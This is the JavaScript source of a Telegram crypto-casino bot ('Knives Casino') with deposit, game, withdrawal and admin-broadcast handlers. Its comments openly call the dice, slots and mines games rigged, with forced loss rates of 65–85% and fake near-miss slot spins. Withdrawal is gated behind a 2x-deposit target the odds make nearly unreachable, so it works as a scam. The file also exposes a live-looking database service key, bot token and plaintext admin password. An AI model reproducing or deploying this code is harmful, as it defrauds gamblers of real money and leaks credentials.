const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIGURATION (INTEGRATED) ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const WALLETS = {
    LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
    SOL: "CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x",
    BTC: "bc1q48a6wvxjwy5ays4gd4asn4lp869khpr9uyve0t"
};

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();

// --- 2. DATABASE HELPER ---
async function getAccount(userId, username) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, 
            username: username || 'anon', 
            balance: 0, 
            total_deposited: 0, 
            bets_placed: 0, 
            total_wagered: 0
        }]).select().single();
        return newUser;
    }
    return data;
}

// --- 3. MAIN WELCOME PAGE ---
bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const msg = `🔪 *WELCOME TO KNIVES CASINO* 🔪\n\n` +
        `💰 *Wallet Balance:* $${(user.balance || 0).toFixed(2)}\n` +
        `📉 *Wagered Today:* $${(user.total_wagered || 0).toFixed(2)}\n\n` +
        `*AVAILABLE GAMES:*\n` +
        `🪙 /flip - Double or Nothing \n` +
        `🚀 /crash - Multiplier \n\n` +
        `*CASHIER:*\n` +
        `📥 /deposit - Buy Credits (Min $5)\n` +
        `📤 /withdraw - Cash Out (Req: 2x Deposit + 2 Bets)\n` +
        `ℹ️ /help - Casino Rules`;
    ctx.replyWithMarkdown(msg);
});

// --- 4. DEPOSIT FEATURE ---
bot.command('deposit', (ctx) => {
    ctx.reply(`📥 *DEPOSIT PORTAL*\nSelect your preferred crypto:`, Markup.inlineKeyboard([
        [Markup.button.callback('Litecoin (LTC)', 'dep_LTC'), Markup.button.callback('Solana (SOL)', 'dep_SOL')],
        [Markup.button.callback('Bitcoin (BTC)', 'dep_BTC')]
    ]));
});

bot.action(/dep_(.*)/, (ctx) => {
    const method = ctx.match[1];
    ctx.replyWithMarkdown(`⚠️ *SEND $5+ USD IN ${method}*\n\nAddress:\n\`${WALLETS[method]}\`\n\n*PROCEDURE:* Send the crypto, then **paste the TX Hash** here. I will verify it and add your balance immediately.`);
});

// Capture TX Hash and send to YOU
bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    // Simple filter: if text is long and not a command, assume it's a hash
    if (text.length > 20 && !text.startsWith('/')) {
        ctx.reply("⌛ *HASH SUBMITTED.* The floor manager is verifying the blockchain. Your credits will appear once confirmed.");
        
        bot.telegram.sendMessage(OWNER_ID, 
            `💰 *NEW DEPOSIT CLAIM*\n\nUser: @${ctx.from.username} (${ctx.from.id})\nHash: \`${text}\``,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ Add $5', `add_${ctx.from.id}_5`), Markup.button.callback('✅ Add $20', `add_${ctx.from.id}_20`)],
                [Markup.button.callback('✅ Add $50', `add_${ctx.from.id}_50`)],
                [Markup.button.callback('❌ Reject', `reject_${ctx.from.id}`)]
            ])
        );
    } else { return next(); }
});

// --- 5. OWNER APPROVAL ACTIONS ---
bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const user = await getAccount(uid);
    const newBal = (user.balance || 0) + parseInt(amt);
    
    await supabase.from('users').update({ 
        balance: newBal, 
        total_deposited: (user.total_deposited || 0) + parseInt(amt) 
    }).eq('user_id', uid);

    bot.telegram.sendMessage(uid, `✅ *DEPOSIT APPROVED!*\n$${amt} has been loaded into your wallet. Good luck!`);
    ctx.editMessageText(`✅ Successfully loaded $${amt} for User ${uid}`);
});

bot.action(/reject_(\d+)/, (ctx) => {
    const uid = ctx.match[1];
    bot.telegram.sendMessage(uid, `❌ *DEPOSIT REJECTED*\nWe couldn't verify this hash on the explorer. Contact support if this is a mistake.`);
    ctx.editMessageText(`❌ Rejected deposit for ${uid}`);
});

// --- 6. GAMES ---
bot.command('flip', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("📖 *FLIP TUTORIAL*\n\nUsage: \`/flip [amount]\`\nExample: \`/flip 10\`\n\nHeads = 2x win. Tails = House wins. 52% house edge.");
    
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet or low balance.");

    const win = Math.random() > 0.52; 
    const newBal = win ? user.balance + bet : user.balance - bet;
    
    await supabase.from('users').update({ 
        balance: newBal, 
        total_wagered: (user.total_wagered || 0) + bet, 
        bets_placed: (user.bets_placed || 0) + 1 
    }).eq('user_id', ctx.from.id);
    
    ctx.reply(win ? `🪙 *HEADS!* You doubled it. New Balance: $${newBal.toFixed(2)}` : `🪙 *TAILS.* Rekt. New Balance: $${newBal.toFixed(2)}`);
});

bot.command('crash', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("🚀 *CRASH TUTORIAL*\n\nUsage: \`/crash [amount]\`\n\nThe rocket flies up. If it crashes before 1.8x, you lose. If it hits 1.8x+, you win 1.8x your bet. 10% chance of instant 1.0x crash (House wins).");

    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet or low balance.");

    const crashPoint = Math.random() < 0.1 ? 1.0 : (Math.random() * 4 + 1).toFixed(2);
    const win = crashPoint >= 1.8; 
    
    const newBal = win ? user.balance + (bet * 0.8) : user.balance - bet;
    await supabase.from('users').update({ 
        balance: newBal, 
        total_wagered: (user.total_wagered || 0) + bet, 
        bets_placed: (user.bets_placed || 0) + 1 
    }).eq('user_id', ctx.from.id);
    
    ctx.reply(`🚀 Rocket launched...\n💥 *CRASHED AT ${crashPoint}x*\n\n${win ? `✅ CASHOUT SUCCESS: +$${(bet*0.8).toFixed(2)}` : `💀 REKT. Try again.`}`);
});

// --- 7. WITHDRAWAL LOGIC ---
bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const target = (user.total_deposited || 0) * 2;
    
    if (user.bets_placed < 2) return ctx.reply("❌ *SECURITY:* You must place at least 2 bets before cashing out.");
    if (user.balance < target || user.balance < 10) {
        return ctx.reply(`❌ *WITHDRAWAL DENIED*\n\nTo prevent hit-and-runs, you must reach *$${target.toFixed(2)}* (2x your total deposits) to withdraw. Keep playing!`);
    }
    
    ctx.reply(`✅ *WITHDRAWAL ELIGIBLE*\n\nDM your wallet address to the owner to receive your funds.`);
    bot.telegram.sendMessage(OWNER_ID, `💸 *WITHDRAWAL ALERT*\nUser @${ctx.from.username} (${ctx.from.id}) is trying to cash out $${user.balance.toFixed(2)}.`);
});

// --- 8. STARTUP ---
app.get('/', (req, res) => res.send('KNIVES CASINO IS LIVE'));
app.listen(process.env.PORT || 10000, '0.0.0.0', () => {
    bot.telegram.deleteWebhook().then(() => {
        bot.launch();
        console.log("Lord Cord Casino is operational.");
    });
});
// =========================================================
// --- LORD CORD EXPANSION: GAMES & ADMIN PANEL ---
// =========================================================

// 1. DICE (65% House Edge - Rigged)
bot.command('dice', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("🎲 *DICE TUTORIAL*\nRoll a 4, 5, or 6 to win 2x!");
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet.");

    // Weighted Random: 65% chance to force a low roll (1-3)
    const isWin = Math.random() > 0.65; 
    const roll = isWin ? Math.floor(Math.random() * 3) + 4 : Math.floor(Math.random() * 3) + 1;
    const newBal = isWin ? user.balance + bet : user.balance - bet;

    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(`🎲 The die rolls... **${roll}**\n${isWin ? `✅ YOU WIN! Bag: $${newBal.toFixed(2)}` : `💀 HOUSE WINS. Bag: $${newBal.toFixed(2)}`}`);
});

// 2. SLOTS (85% House Edge - Near Miss Logic)
bot.command('slots', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("🎰 *SLOTS TUTORIAL*\nMatch 3 emojis to win 5x!");
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet.");

    const icons = ['💎', '🍒', '🍋', '🔔', '7️⃣'];
    let s1, s2, s3;
    // 85% chance to force a "Near Miss" (Match 2 but fail the 3rd)
    if (Math.random() < 0.85) {
        s1 = icons[Math.floor(Math.random() * icons.length)];
        s2 = s1; 
        s3 = icons.filter(i => i !== s1)[Math.floor(Math.random() * 4)]; 
    } else {
        s1 = icons[Math.floor(Math.random() * icons.length)];
        s2 = icons[Math.floor(Math.random() * icons.length)];
        s3 = icons[Math.floor(Math.random() * icons.length)];
    }

    const win = (s1 === s2 && s2 === s3);
    const newBal = win ? user.balance + (bet * 4) : user.balance - bet;
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(`🎰 [ ${s1} | ${s2} | ${s3} ]\n${win ? `✅ JACKPOT! +$${(bet * 5).toFixed(2)}` : `💀 SO CLOSE! Try again.`}`);
});

// 3. MINES (75% House Edge - Weighted Trap)
bot.command('mines', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("💣 *MINES TUTORIAL*\nFind the gem to win 1.5x!");
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet.");

    const hitMine = Math.random() < 0.75; 
    const newBal = hitMine ? user.balance - bet : user.balance + (bet * 0.5);
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    
    ctx.reply(`${hitMine ? "🟥 💣 🟥" : "🟦 💎 🟦"}\n${hitMine ? `💀 BOOM. Mine hit. -$${bet}` : `💎 SAFE. Gem found! +$${(bet * 0.5).toFixed(2)}`}`);
});

// 4. ADMIN PANEL & BROADCAST
bot.command('admin', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return; // Silent ignore for non-owners
    ctx.reply("🔒 *ADMIN ACCESS*\nPlease enter the master password:");
});

bot.on('text', async (ctx, next) => {
    // PASSWORD GATE
    if (ctx.message.text === "iamaking2000") {
        if (ctx.from.id !== OWNER_ID) return ctx.reply("Access Denied.");
        
        const { data: allUsers } = await supabase.from('users').select('*');
        const totalWagered = allUsers.reduce((sum, u) => sum + (u.total_wagered || 0), 0);
        const totalDep = allUsers.reduce((sum, u) => sum + (u.total_deposited || 0), 0);
        const currentBal = allUsers.reduce((sum, u) => sum + (u.balance || 0), 0);
        const houseProfit = totalDep - currentBal;

        const stats = `👑 *KNIVES CASINO ADMIN*\n\n` +
            `👥 Active Players: ${allUsers.length}\n` +
            `📥 Total Deposits: $${totalDep.toFixed(2)}\n` +
            `📉 Total Wagered: $${totalWagered.toFixed(2)}\n` +
            `💰 *HOUSE PROFIT: $${houseProfit.toFixed(2)}*\n\n` +
            `*ADMIN COMMANDS:*`;
        
        return ctx.replyWithMarkdown(stats, Markup.inlineKeyboard([
            [Markup.button.callback('📢 Broadcast Msg', 'admin_broadcast')],
            [Markup.button.callback('📊 Refresh Stats', 'admin_refresh')]
        ]));
    }

    // BROADCAST HANDLER
    if (ctx.message.text.startsWith('BC:') && ctx.from.id === OWNER_ID) {
        const msg = ctx.message.text.replace('BC:', '').trim();
        const { data: users } = await supabase.from('users').select('user_id');
        let count = 0;
        for (let u of users) {
            try {
                await bot.telegram.sendMessage(u.user_id, `🔔 *ANNOUNCEMENT:*\n\n${msg}`, { parse_mode: 'Markdown' });
                count++;
            } catch (e) {}
        }
        return ctx.reply(`✅ Broadcast sent to ${count} users.`);
    }
    return next();
});

bot.action('admin_broadcast', (ctx) => {
    ctx.reply("📢 *BROADCAST MODE*\nType your message starting with `BC:`\nExample: `BC: Bonus credits for all active players!`");
});
